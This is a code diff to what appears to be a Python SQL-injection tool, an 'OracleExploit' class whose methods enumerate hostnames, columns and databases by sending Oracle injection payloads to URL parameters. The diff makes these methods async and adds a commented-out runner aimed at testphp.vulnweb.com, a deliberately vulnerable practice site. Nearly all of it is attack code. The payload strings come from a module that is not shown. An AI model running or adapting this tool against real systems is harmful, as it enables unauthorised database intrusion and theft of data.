@@ -81,7 +81,7 @@ class OracleExploit(
     def __init__(self):
         super().__init__(self)
     @staticmethod 
-    def Hostname_Attack(urls)->None:
+    async def Hostname_Attack(urls)->None:
         parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.Host_name_oracle(viewcolumn=random.choice(columns),hostname=parameter,table=random.choice(tables))
         rows = payload.split("\n")
@@ -107,7 +107,7 @@ class OracleExploit(
 
     
     @staticmethod
-    def db_column_exploit(urls)->None:
+    async def db_column_exploit(urls)->None:
         parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.db_column_list("id","column","table")
         rows = payload.split("\n")
@@ -131,7 +131,7 @@ class OracleExploit(
                 logger.critical("Host is down.")
 
     @staticmethod 
-    def db_column_list_exploit(urls)->None:
+    async def db_column_list_exploit(urls)->None:
         parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.db_column_list(column=parameter,table=random.choice(tables))
         rows = payload.split("\n")
@@ -155,7 +155,7 @@ class OracleExploit(
                 logger.critical("Host is down.")
 
     @staticmethod
-    def oracle_injection_exploit(urls)->None:
+    async def oracle_injection_exploit(urls)->None:
         parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.oracle_injection_payload(table=random.choice(tables),column=parameter)
         rows = payload.split("\n")
@@ -179,7 +179,7 @@ class OracleExploit(
                 logger.critical("Host is down.")
 
     @staticmethod
-    def oracle_injection_database_list_attack(urls)->None:
+    async def oracle_injection_database_list_attack(urls)->None:
         parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.oracle_injection_database_list(column=parameter,table=random.choice(tables))
         rows = payload.split("\n")
@@ -213,3 +213,14 @@ class OracleExploit(
 #     Thread = threading.Thread(thread)
 #     Thread.start()
 #     Thread.join()
+
+# async def main():
+#     await asyncio.gather(
+#         OracleExploit.db_column_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#         OracleExploit.db_column_list_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#         OracleExploit.oracle_injection_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#         OracleExploit.oracle_injection_database_list_attack("http://testphp.vulnweb.com/artists.php?artist=1")
+#     )
+
+
+# asyncio.run(main())
